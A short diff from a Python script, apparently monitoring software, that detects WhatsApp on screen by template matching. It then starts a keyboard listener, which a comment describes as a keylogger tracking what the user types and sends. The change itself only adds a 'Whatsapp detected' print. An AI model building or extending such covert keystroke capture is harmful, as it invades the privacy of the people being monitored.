@@ -68,7 +68,7 @@ def startscreenrecorder():
                     locations = np.where(results >= 0.75) # threshold is used so as to ensure that detection is accurate.
         
             if (list(zip(*locations[::-1])) != []): #if there are matches of the template found in the orignal image
-                
+                print("Whatsapp detected")
                 if platform == "win" or platform == "macosx":
                     listener = keyboard.Listener(on_release=on_release) #start a keylogger on a seperate thread to track what the user is typing, and if he has sent a message etc
                 #android is still a work in progress
